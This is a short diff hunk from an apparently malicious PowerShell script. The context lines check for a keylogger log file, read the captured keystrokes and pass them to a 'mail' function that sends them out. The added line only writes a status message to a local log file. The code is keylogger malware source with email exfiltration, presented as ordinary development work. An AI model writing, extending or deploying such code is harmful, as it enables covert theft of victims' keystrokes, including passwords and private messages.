@@ -431,6 +431,7 @@ function mail($messageBody){
 			if([System.IO.File]::Exists($keyloggerLogFilePath)){
 					$keyloggerFileContents = type $keyloggerLogFilePath
 					mail $keyloggerFileContents
+					echo "sending mail" | out-file .\log.txt
 			}
 			else{
 				"Keylogger log does not exist"
